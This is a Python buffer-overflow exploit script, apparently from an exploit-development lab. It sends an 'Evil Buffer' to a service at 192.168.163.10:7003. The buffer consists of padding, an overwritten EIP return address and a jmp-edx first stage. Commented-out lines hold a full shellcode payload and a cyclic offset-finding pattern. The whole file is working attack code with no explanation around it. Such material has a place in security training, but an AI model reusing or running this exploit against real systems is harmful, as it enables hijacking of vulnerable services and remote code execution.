#!/usr/bin/python
import socket, time, sys

try:
    

    print("\nSending Evil Buffer...")

    nop_sled = "\x90" * 8
    # shellcode =  b""
    # shellcode += b"\xda\xc4\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x52"
    # shellcode += b"\xbb\xcf\x2a\xbc\xc3\x83\xe8\xfc\x31\x58\x13"
    # shellcode += b"\x03\x97\x39\x5e\x36\xdb\xd6\x1c\xb9\x23\x27"
    # shellcode += b"\x41\x33\xc6\x16\x41\x27\x83\x09\x71\x23\xc1"
    # shellcode += b"\xa5\xfa\x61\xf1\x3e\x8e\xad\xf6\xf7\x25\x88"
    # shellcode += b"\x39\x07\x15\xe8\x58\x8b\x64\x3d\xba\xb2\xa6"
    # shellcode += b"\x30\xbb\xf3\xdb\xb9\xe9\xac\x90\x6c\x1d\xd8"
    # shellcode += b"\xed\xac\x96\x92\xe0\xb4\x4b\x62\x02\x94\xda"
    # shellcode += b"\xf8\x5d\x36\xdd\x2d\xd6\x7f\xc5\x32\xd3\x36"
    # shellcode += b"\x7e\x80\xaf\xc8\x56\xd8\x50\x66\x97\xd4\xa2"
    # shellcode += b"\x76\xd0\xd3\x5c\x0d\x28\x20\xe0\x16\xef\x5a"
    # shellcode += b"\x3e\x92\xeb\xfd\xb5\x04\xd7\xfc\x1a\xd2\x9c"
    # shellcode += b"\xf3\xd7\x90\xfa\x17\xe9\x75\x71\x23\x62\x78"
    # shellcode += b"\x55\xa5\x30\x5f\x71\xed\xe3\xfe\x20\x4b\x45"
    # shellcode += b"\xfe\x32\x34\x3a\x5a\x39\xd9\x2f\xd7\x60\xb6"
    # shellcode += b"\x9c\xda\x9a\x46\x8b\x6d\xe9\x74\x14\xc6\x65"
    # shellcode += b"\x35\xdd\xc0\x72\x3a\xf4\xb5\xec\xc5\xf7\xc5"
    # shellcode += b"\x25\x02\xa3\x95\x5d\xa3\xcc\x7d\x9d\x4c\x19"
    # shellcode += b"\xd1\xcd\xe2\xf2\x92\xbd\x42\xa3\x7a\xd7\x4c"
    # shellcode += b"\x9c\x9b\xd8\x86\xb5\x36\x23\x41\x7a\x6e\x5c"
    # shellcode += b"\x32\x12\x6d\xa2\x25\xb8\xf8\x44\x2f\x2e\xad"
    # shellcode += b"\xdf\xd8\xd7\xf4\xab\x79\x17\x23\xd6\xba\x93"
    # shellcode += b"\xc0\x27\x74\x54\xac\x3b\xe1\x94\xfb\x61\xa4"
    # shellcode += b"\xab\xd1\x0d\x2a\x39\xbe\xcd\x25\x22\x69\x9a"
    # shellcode += b"\x62\x94\x60\x4e\x9f\x8f\xda\x6c\x62\x49\x24"
    # shellcode += b"\x34\xb9\xaa\xab\xb5\x4c\x96\x8f\xa5\x88\x17"
    # shellcode += b"\x94\x91\x44\x4e\x42\x4f\x23\x38\x24\x39\xfd"
    # shellcode += b"\x97\xee\xad\x78\xd4\x30\xab\x84\x31\xc7\x53"
    # shellcode += b"\x34\xec\x9e\x6c\xf9\x78\x17\x15\xe7\x18\xd8"
    # shellcode += b"\xcc\xa3\x29\x93\x4c\x85\xa1\x7a\x05\x97\xaf"
    # shellcode += b"\x7c\xf0\xd4\xc9\xfe\xf0\xa4\x2d\x1e\x71\xa0"
    # shellcode += b"\x6a\x98\x6a\xd8\xe3\x4d\x8c\x4f\x03\x44"
    # padding = "A" * (2080 - len(nop_sled) - len(shellcode))
    padding = "A" * 2080
    #eip = "\xcf\x10\x80\x14"
    eip = "\x1e\x11\x80\x14"
    offset = "C" * 4
    first_stage = "\xff\xe2\x90\x90\x90\x90\x90\x90"
    #buffer = "D" * (2700 - len(filler) - len(eip) - len(offset))

    #inputBuffer = nop_sled + shellcode + padding + eip + first_stage 
    inputBuffer = padding + eip + first_stage
    #inputBuffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"
    #print(inputBuffer)
    
    buffer = inputBuffer

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.163.10', 7003))
    s.send(buffer)

    s.close()
    print("\nDone!")

except Exception as e: 
    print(e)
    print("Could not connect!")
    sys.exit()